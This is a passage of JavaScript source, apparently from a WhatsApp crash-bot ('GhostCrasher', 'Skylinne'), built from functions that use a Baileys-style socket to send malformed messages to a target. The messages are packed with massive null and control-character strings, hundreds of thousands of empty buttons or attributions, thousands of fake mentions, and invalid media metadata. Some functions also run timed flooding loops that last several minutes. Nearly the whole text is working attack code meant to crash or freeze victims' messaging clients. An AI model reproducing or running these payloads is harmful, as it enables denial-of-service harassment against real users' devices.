        await sock.groupParticipantsUpdate(target, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}

async function LexcaabosV5(sock, target) {
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const generateWAMessageFromContent = (jid, message, options) => {
        return {
            key: { id: Date.now().toString() + Math.random().toString(36).substring(2) },
            message: message
        };
    };

    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "Skylinne - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " make ni anak " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "Skylinne Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oADAMBAAIRAxEAPwDGcfAugToxzYdhWCzGoW3InmczjWKU/OD5TigotHUsWsWvS6iIC4JIIYysMlllKEGbgkIEBubHe+yJhlFW5l665mRa9th3KMC+4b1oSnxcv8Y/HkolbO9PFx2vUprBfiKoS/F+P+fPW45bQ5djcyfkaxK6zMb49QGbu92TKwXr3K/hx9GZOKuUvx2Pb/SKzGxcxaG7r3skM/5+QjZmxZx/je8x6Jj4xrVQfGzK2Xk3zF5XWIHL5qplDn4LKzuxS7mQ2qyB7gNNbbdx71GX8pFrHmZkMRNFLPUx1uPHY+JbUvIb+D6n+QaPjZR2D2Vi3rqmD18jqPUn7FTorPIVepitYjA2L2Qpk1dU+ow++Zh8VcHymfc3cTNx8amC41P1B4oWU5KsjfUxLLU43sR5V5Hbtfl1M6hP8ANL4jX+iLkY0of+4s2dRYbsZMcM54HqYFZdDmVr8Tn+zMjI3ouYOFdXbYox+P2KItuID5P8A2Utj2P8A/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "GhostCrasher - Executed",
                                fileName: "Ghost X - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Ghost X",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: true,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "Skylinne - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString() + Math.random().toString(36).substring(2),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "GhostXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: true,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        viewOnceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: true });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "GhostCrasher Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: true,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Skylinne - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "GhostTeam",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Skylinne - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "GhostCrasher - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: true });

        await sleep(500);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: true });
    }

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: "\u0003".repeat(9000),
            },
        },
    }, { participant: true });
}

async function CrasNoCLikV2(sock, target) {
  const XyutS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "MakLo¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const xfc = generateWAMessageFromContent(target, XyutS, {});

await sock.relayMessage(target, xfc.message, {
// participant: true, 
  messageId: xfc.key.id
})

}

async function convQtd(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sleep(500);
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: '- # GhostCrash3r ん.',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {
        participant: true
      }
    );
  }
}

async function xofm(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "ี".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\{".repeat(9999),
                buttons: "ี".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, msg.message, {});
    
    await sock.chatModify({
      delete: true,
      lastMessages: [{
        key: {
          remoteJid: target,
          fromMe: true,
          id: msg.key.id
        },
        messageTimestamp: Date.now()
      }]
    }, target);
  }
}

async function DelayXFreze(sock, target) {
const CrBLock = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "GhostCrasher Mau Lewat...🩸"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const Crb = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

async function BlankOnehit(sock, target) {
    const groupJid = "123456789012899@g.us"
    const inviteCode = "AbCdEfGhIjKlMn"
    const newsletterJid = "123456789@newsletter"
    const inviteExpiration = Math.floor(Date.now() / 1000) + 85000
    const groupMsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            groupInviteMessage: {
                groupJid,
                inviteCode,
                inviteExpiration,
                groupName: "𑜦𑜠".repeat(30000),
                caption: "GhostCrasher - Executed ¿!⃟" + "ꦽ".repeat(30000)
            }
        }),
        {}
    )
    await sock.relayMessage(target, groupMsg.message, { messageId: groupMsg.key.id })
    const newsletterMsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            newsletterAdminInviteMessage: {
                newsletterJid,
                newsletterName: "ꦾ".repeat(30000) + ":҉⃝҉".repeat(30000),
                caption: "# ᯓ 𝙎𝙆𝙔𝙇𝙄𝙉𝙉𝙀 益" + "ꦽ".repeat(40000),
                inviteExpiration
            }
        }),
        {}
    )
    await sock.relayMessage(target, newsletterMsg.message, { messageId: newsletterMsg.key.id })
}

async function sticXcrash(sock, target) {
    const myJid = sock.user?.id?.split(":")[0] + "@s.whatsapp.net";
    if (!target || target === myJid) return;
    const msg = generateWAMessageFromContent(
        target,
        {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                mimetype: "image/webp",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileLength: "10610",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091"
            }
        },
        {}
    );

    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        {
            messageId: msg.key.id
        }
    );
}

async function BuldozerXLoca(sock, target) { //buldozer x crash
let MSG = {
locationMessage: {
degreesLatitude: -66.666,
degreesLongitude: 66.666,
name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
jpegThumbnail: null,
url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
contextInfo: {
participant: target,
forwardingScore: 1,
isForwarded: true,
stanzaId: target,
mentionedJid: [target],
fileSha256: Buffer.from([
226, 213, 217, 102, 205, 126, 232, 145,
0, 70, 137, 73, 190, 145, 0, 44,
165, 102, 153, 233, 111, 114, 69, 10,
55, 61, 186, 131, 245, 153, 93, 211
]),
fileLength: 432722,
seconds: 26,
ptt: false,
mediaKey: Buffer.from([
182, 141, 235, 167, 91, 254, 75, 254,
190, 229, 25, 16, 78, 48, 98, 117,
42, 71, 65, 199, 10, 164, 16, 57,
189, 229, 54, 93, 69, 6, 212, 145
]),
fileEncSha256: Buffer.from([
29, 27, 247, 158, 114, 50, 140, 73,
40, 108, 77, 206, 2, 12, 84, 131,
54, 42, 63, 11, 46, 208, 136, 131,
224, 87, 18, 220, 254, 211, 83, 153
])
},
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 9999999999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "Skylinne" + "ꦾ".repeat(55555) + "ោ៝".repeat(55555) + "@5".repeat(55555),
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: "\u0003".repeat(12000),
},
{
name: "call_permission_request",
buttonParamsJson: "\u0003".repeat(12000),
},
{
name: "review_order",
buttonParamsJson: "\u0003".repeat(12000),
},
{
name: "galaxy_message",
buttonParamsJson: "\u0003".repeat(12000),
},
{
name: "review_and_pay",
buttonParamsJson: "\u0003".repeat(12000),
},
{
name: "request_payment",
buttonParamsJson: JSON.stringify({
amount: "99999999999999999999",
currency: "IDR",
note: "\u0000".repeat(50000)
})
},
{
name: "send_payment",
buttonParamsJson: JSON.stringify({
transaction_id: "\u0000".repeat(50000),
amount: "99999999999999999999",
status: "pending"
})
},
{
name: "checkout_payment",
buttonParamsJson: JSON.stringify({
order_id: "\u0000".repeat(50000),
amount: "99999999999999999999",
customer: {
name: "\u0000".repeat(50000),
email: "\u0000".repeat(50000)
}
})
},
{
name: "multi_product",
buttonParamsJson: JSON.stringify({
catalog_id: "\u0000".repeat(50000),
product_ids: Array.from({ length: 1000 }, () => "\u0000".repeat(50000))
})
},
{
name: "catalog_message",
buttonParamsJson: JSON.stringify({
catalog_id: "\u0000".repeat(50000),
product_retailer_id: "\u0000".repeat(50000)
})
},
{
name: "native_flow",
buttonParamsJson: JSON.stringify({
flow_token: "\u0000".repeat(50000),
flow_id: "\u0000".repeat(50000)
})
}
],
messageParamsJson: "\u0000".repeat(500000)
}
}
}
}
}
};
await sock.relayMessage(target, MSG, {});
console.log('Send Bug Skylinne X Buldo');
}

async function delayerhard(sock, target) { //delay invis
    const constants = {
        statusBroadcast: "status@broadcast",
        buttonText: "Click Here",
        flowName: "call_permission_request",
        accessKey: "CALL_ACCESS",
        metaTag: "meta",
        contactsTag: "contacts",
        mentionedUsersTag: "mentioned_users"
    };
    const body = { text: "XX" };
    const buttonLength = { length: 500000 };   
    const urlLength = { length: 900000 };    
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: body,
                    nativeFlowMessage: {
                        buttons: Array.from(buttonLength, () => ({}))
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, msg1, { participant: true });
    const msg2 = {
        interactiveResponseMessage: {
            body: {
                text: constants.buttonText,
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: constants.flowName,
                paramsJson: "FORM_SCREEN",
                version: 3
            },
            contextInfo: {
                remoteJid: "0.dkwzzqyl7ei" + constants.accessKey,
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from(urlLength, () => ({
                        xN0000: "Grettles"
                    }))
                }
            }
        }
    };
    const options = {
        participant: true,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: constants.metaTag,
                attrs: {
                    status_setting: constants.contactsTag
                },
                content: [
                    {
                        tag: constants.mentionedUsersTag,
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: {
                                    jid: target
                                },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    };
    await sock.relayMessage(constants.statusBroadcast, msg2, options);
}

async function ForceMediaByDewa(sock, target) {
try {
const Dewa = {
imageMessage: {
url: "https://wa.me/settings/linked_devices/,,dewa",
mimetype: "image/jpeg",
caption: "\u67FD".repeat(5000),
fileSha256: Buffer.from("\u67FD".repeat(1000)),
fileLength: 999999,
height: 9999,
width: 9999,
mediaKey: Buffer.from("\u67FD".repeat(1000)),
fileEncSha256: Buffer.from("\u67FD".repeat(1000)),
directPath: "/",
contextInfo: {
mentionedJid: [
target,
"13135550002@s.whatsapp.net",
...Array.from({ length: 500 }, () =>
"1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
)
],
isForwarded: true,
forwardingScore: 9999999,
deviceListMetadata: {
senderKeyIndex: 999,
senderTimestamp: Date.now() + 999999,
recipientKeyIndex: 999
},
deviceListMetadataVersion: 999,
messageSecret: Buffer.from("\u67FD".repeat(1000))
}
}
};

await sock.relayMessage(target, Dewa, {});

const Dewa2 = {
message: {
decodeMessage: {
message: {
text: "\u67FD".repeat(5000),
mentionedJid: [
target,
"13135550002@s.whatsapp.net",
...Array.from({ length: 500 }, () =>
"1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
)
],
contextInfo: {
deviceListMetadata: {
senderKeyIndex: 999,
senderTimestamp: Date.now() + 999999,
recipientKeyIndex: 999
},
deviceListMetadataVersion: 999,
messageSecret: Buffer.from("\u67FD".repeat(1000))
}
}
}
}
};

await sock.relayMessage(target, Dewa2, {});

console.log(`✅  crash sent to ${target}`);
} catch (error) {
console.error(error.message);
}
}

async function iosQsx(sock, target) {
  let msg = generateWAMessageFromContent(target,
    {
      contactMessage: {
        displayName:
